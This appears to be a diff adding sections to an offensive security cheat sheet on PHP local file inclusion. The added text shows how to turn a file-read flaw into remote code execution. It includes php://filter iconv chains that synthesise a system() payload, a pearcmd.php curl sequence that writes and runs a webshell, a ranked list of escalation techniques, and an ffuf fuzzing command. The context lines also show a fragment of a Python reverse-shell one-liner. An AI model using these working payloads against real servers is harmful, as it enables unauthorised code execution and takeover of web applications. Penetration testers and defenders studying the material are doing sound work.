@@ -272,6 +272,56 @@ Php://Filter/Resource=admin.php
 
 ---
 
+## PHP Filter Chains → RCE (no file upload, default config)
+
+The single most important modern LFI escalation. If you control the *entire* string passed to `include`/`require` (or any function that processes a `php://filter` chain), you can **generate arbitrary PHP bytes from nothing** using `convert.iconv` filters — turning a pure file-read LFI into RCE. **Works with `allow_url_include=Off`** (default) because `php://filter` is not a remote wrapper.
+
+How it works: chained `convert.iconv.*` encoders progressively prepend bytes; combined with base64 decode you can synthesize a `<?php system($_GET[0]);?>` payload as the included content, with no file on disk.
+
+```bash
+# Synacktiv generator — outputs the (very long) filter-chain payload
+python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'
+# -> php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
+
+# Use it in the vulnerable include param:
+curl "http://TARGET/index.php?page=php://filter/convert.iconv.<LONG_CHAIN>/resource=php://temp&0=id"
+```
+
+```text
+# Tools
+- synacktiv/php_filter_chain_generator   (generate the chain)
+- Tanguy-Boisset/LFI-to-RCE-filters      (end-to-end script: feeds the chain to the LFI)
+- ambionics/wrapwrap                     (build php://filter wrappers around a resource)
+```
+
+> Notes: any path works (or use `resource=php://temp`); `allow_url_include` is NOT required.
+> This also powers many 2025 CVEs (e.g. unauth LFI→RCE in panels). Combine with `php://filter/convert.base64-encode/...` for read-only when the chain is blocked.
+
+---
+
+## LFI → RCE: technique selection
+
+```text
+1. PHP filter chain (above)        -> default config, no upload, no log access needed  [BEST]
+2. data:// wrapper                 -> needs allow_url_include=On
+3. Log poisoning                   -> needs readable log path + injectable header
+4. /proc/self/environ              -> needs PHP < ~5.3 / specific configs, readable environ
+5. PHP session poisoning           -> needs known session path + controllable session value
+6. Upload + include                -> needs an upload primitive
+7. phar:// deserialization         -> if a gadget chain exists (see deserialization KB)
+8. expect:// wrapper               -> needs expect extension loaded
+```
+
+### pearcmd.php trick (LFI → RCE when register_argc_argv=On)
+
+```bash
+# Abuse the bundled PEAR file to write a webshell, no upload required
+curl "http://TARGET/?page=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?=system($_GET[0])?>+/tmp/s.php"
+curl "http://TARGET/?page=/tmp/s.php&0=id"
+```
+
+---
+
 ## Session File Poisoning
 
 ```
@@ -409,6 +459,24 @@ python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 | Burp Suite | Intercept and modify LFI payloads |
 | curl | Manual LFI testing and log poisoning |
 | Netcat | Reverse shell listeners |
-| Wfuzz | Automated LFI parameter discovery |
-| LFISuite | Automated LFI exploitation framework |
-| Kadimus | Advanced LFI exploitation tool |
+| Wfuzz / ffuf | Automated LFI parameter discovery |
+| LFISuite / Kadimus | Automated LFI exploitation frameworks |
+| php_filter_chain_generator | Generate filter-chain RCE payloads |
+| LFI-to-RCE-filters | End-to-end filter-chain LFI→RCE |
+
+```bash
+# ffuf LFI fuzzing with a traversal wordlist
+ffuf -u "http://TARGET/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
+```
+
+---
+
+## References
+
+- PortSwigger — File path traversal / inclusion: https://portswigger.net/web-security/file-path-traversal
+- PayloadsAllTheThings — File Inclusion: https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/
+- HackTricks — LFI/RFI: https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
+- HackTricks — LFI2RCE via PHP filters: https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html
+- Synacktiv — php_filter_chain_generator: https://github.com/synacktiv/php_filter_chain_generator
+- LFI-to-RCE-filters: https://github.com/Tanguy-Boisset/LFI-to-RCE-filters
+- The Hacker Recipes — PHP wrappers & streams: https://www.thehacker.recipes/web/inputs/file-inclusion/
